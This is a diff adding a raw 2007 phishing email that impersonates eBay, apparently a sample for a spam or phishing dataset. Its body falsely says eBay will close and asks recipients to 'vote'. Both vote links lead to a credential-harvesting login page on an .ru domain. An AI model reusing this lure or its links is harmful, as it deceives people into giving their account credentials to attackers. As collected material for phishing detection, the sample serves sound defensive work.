@@ -1,0 +1,144 @@
+Return-Path: <root@ns.vcash.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id B3A514691D
+	for <user@login.example.com>; Fri, 19 Jan 2007 21:10:21 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 5D65A131FCC9
+	for <user@example.com>; Fri, 19 Jan 2007 21:10:21 -0500 (EST)
+Received: from ns.vcash.com (vcash.com [66.132.162.76])
+	by mail.example.org (Postfix) with ESMTP id 55FE76FA1C4
+	for <user@example.com>; Fri, 19 Jan 2007 21:10:21 -0500 (EST)
+Received: from ns.vcash.com 
+	by ns.vcash.com (8.12.8/8.12.8) with ESMTP id l0KEsnuV028960
+	for <user@example.com>; Sat, 20 Jan 2007 09:54:49 -0500
+Received: (from root@localhost)
+	by ns.vcash.com (8.12.8/8.12.8/Submit) id l0KEsn38028958
+	for user@example.com; Sat, 20 Jan 2007 09:54:49 -0500
+Date: Sat, 20 Jan 2007 09:54:49 -0500
+To: user@example.com
+Subject: Your opinion counts
+Message-ID: <1169304889.23738.qmail@eBay.com>
+From: "eBay" <vote@eBay.com>
+Content-Type: text/html
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 643
+
+<style>
+<!--
+.page
+{
+	background: #FFFFFF;
+	color: #000000;
+}
+.tborder
+{
+	background: #FFFFFF;
+	color: #000000;
+	border: 1px solid #833750;
+}
+td
+{
+	font: 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.alt1
+{
+	background: #FFF5F5;
+	color: #000000;
+}
+.smallfont
+{
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.thead
+{
+	background: #995C70 url('gradient_thead.gif') repeat-x top left;
+	color: #FFF7F7;
+	font-style:normal; font-variant:normal; font-weight:bold; font-size:11px; font-family:tahoma, verdana, geneva, lucida, lucida grande, arial, helvetica, sans-serif
+}
+td.thead { padding: 4px; }
+
+.borderwrap{ /* this will affect the outlining border of all the tables and boxes through-out the skin. */
+	background: #FFF; 
+	border: 1px solid #072A66;
+	padding: 0px; 
+	margin: 0px; 
+}
+
+.ipbtable { width:100% }
+
+table.ipbtable
+{ /* required for text in tables, because tables do not inherit from body */
+	background: transparent;
+	color: #222;
+	font-size: 11px;
+	line-height: 135%;
+}
+
+.post1{ 
+	background: #F5F9FD;
+}
+
+.ipbtable td{ /* gives all tables faux cellpadding of 5px */
+	padding: 5px;
+}
+
+.postcolor{ 
+	font-size: 12px; 
+	line-height: 160%;
+}
+
+.quotemain{
+	border-right:1px dotted #000; border-bottom:1px dotted #000; background:#FAFCFE; border-left:4px solid #8394B2; border-top:0px none; color: #465584;
+	padding: 4px;
+	margin-left:auto; margin-right:auto; margin-top:0; margin-bottom:8px
+}
+
+-->
+</style>
+<TABLE BGCOLOR="#EFEFFF" CELLPADDING="0" CELLSPACING="0" BORDER="0" WIDTH="803" ALIGN="CENTER" height="307"><TR>
+  <TD WIDTH="5" height="307"></TD>
+  <HTML><BODY><TD WIDTH="912" VALIGN="TOP" height="307"><p></p>
+  <p></p>
+  <p><font size="2"></font></p>
+  <p><font size="2"> January 19, 2007 </font></p>
+  <p><font size="2"> Dear eBay Community:</font><span style="font-size: 11pt">
+  </span></p>
+  <p><b> We have decided to close eBay on 27 February 2007 due to the 
+  repeatedly abuses on our company. We ask your opinion on this matter and we 
+  want to know if you agree with us or disagree .Below you can make your choice.
+  </b></p>
+  <p> If you want eBay to stay open click <b>YES</b> otherwise click
+  <b>NO .</b>Your opinion is very important to us. If 50% of the eBay members 
+  vote positive eBay stays open otherwise it will be closed.</p>
+  <p> <font size="3"><b></b></font><font face="Arial, Helvetica, sans-serif" size="2">Regards,<br>
+ 
+  eBay Team </font></p>
+  <p> &nbsp;</p>
+  <p></p>
+  <p></p>
+  <p>
+  <font size="4">
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font>&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;
+  <b><font size="5">
+  <a href="http://www.e-www.ru/login.html" style="text-decoration: none">YES</a></font></b><font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font>
+  <b><font size="5">
+  <a href="http://www.e-www.ru/login.html" style="text-decoration: none">NO</a></font></b></p>
+  <p></p>
+  <p>&nbsp;</p>
+  <p>&nbsp;</p>
+  <p><br>
+  </p>
+  <p></p>
+  
+  </BODY></HTML>
+  <p> <p> <A href="http://www.ebay.com/" target=_blank>
+<IMG 
+src="http://pics.ebaystatic.com/aw/pics/email/eBayLogo.gif" align=right 
+border=0 width="37" height="18"></A><font color="#666666" face="Verdana, Arial, Helvetica, sans-serif" size="1"><strong>eBay sent this message to you based on your good account standing.</strong>
+  <br>
+  Your registered name is included to show this message originated from eBay.</font></table>
+
